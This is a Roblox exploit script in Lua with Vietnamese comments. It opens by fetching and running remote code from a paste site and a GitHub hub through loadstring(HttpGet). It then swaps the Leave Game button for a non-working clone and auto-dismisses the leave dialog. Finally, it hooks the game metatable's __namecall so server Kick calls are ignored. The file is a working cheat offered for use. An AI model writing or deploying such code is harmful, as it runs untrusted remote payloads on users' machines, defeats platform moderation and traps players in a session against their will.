loadstring(game:HttpGet("https://cdn.sourceb.in/bins/ej1P22FR5T/0"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/weziiotez-dev/xt-hub/main/crazy.lua"))()
local CoreGui    = game:GetService("CoreGui")
local RunService = game:GetService("RunService")

local function fakeLeaveBtn(obj)
    if not obj or not obj.Parent then return end
    local container = obj.Parent

    -- Clone y chang (copy toàn bộ visual, children, LayoutOrder)
    local fake = obj:Clone()

    -- Tắt hoàn toàn interactivity
    fake.Active           = false
    fake.AutoButtonColor  = false
    fake.Selectable       = false

    -- Xóa script bên trong nếu có
    for _, v in ipairs(fake:GetDescendants()) do
        if v:IsA("BaseScript") then v:Destroy() end
    end

    -- Giữ đúng LayoutOrder để UIListLayout căn đúng vị trí
    fake.LayoutOrder = obj.LayoutOrder

    -- Destroy nút thật, insert fake vào cùng parent
    obj:Destroy()
    fake.Parent = container

    -- Auto click DontLeave (đóng dialog)
    task.wait(0.04)
    local dontLeave = container:FindFirstChild("DontLeaveGameButton")
    if dontLeave then
        pcall(function() dontLeave:Activate() end)
    end
end

-- Bắt mọi lần LeaveGameButton xuất hiện / recreate
CoreGui.DescendantAdded:Connect(function(obj)
    if obj.Name == "LeaveGameButton" then
        task.wait(0.03)
        pcall(fakeLeaveBtn, obj)
    end
end)

-- Heartbeat phòng button đã có sẵn
local _checked = false
RunService.Heartbeat:Connect(function()
    local obj = CoreGui:FindFirstChild("LeaveGameButton", true)
    if obj and not _checked then
        _checked = true
        pcall(fakeLeaveBtn, obj)
        task.delay(1, function() _checked = false end)
    end
end)

-- Scan ngay lần đầu
for _, obj in ipairs(CoreGui:GetDescendants()) do
    if obj.Name == "LeaveGameButton" then
        pcall(fakeLeaveBtn, obj)
        break
    end
end

-- Hook Kick
pcall(function()
    local mt = getrawmetatable(game)
    setreadonly(mt, false)
    local orig = mt.__namecall
    mt.__namecall = newcclosure(function(self, ...)
        if getnamecallmethod() == "Kick" then return end
        return orig(self, ...)
    end)
    setreadonly(mt, true)
end)
